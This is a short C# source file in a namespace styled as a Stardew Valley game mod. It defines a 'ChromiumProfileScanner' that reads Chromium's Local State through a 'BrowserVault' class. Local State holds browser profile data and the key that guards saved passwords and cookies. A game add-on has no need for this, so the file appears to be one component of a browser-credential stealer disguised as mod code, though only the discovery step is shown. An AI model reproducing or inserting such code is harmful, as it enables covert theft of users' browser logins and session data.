namespace StardewVolley.Internal;

internal sealed class ChromiumProfileScanner
{
	private readonly BrowserVault vault;

	public ChromiumProfileScanner(BrowserVault vault)
	{
		this.vault = vault;
	}

	public BrowserProfile[] DiscoverProfiles()
	{
		return new BrowserProfile[1] { this.vault.ReadLocalState() };
	}
}
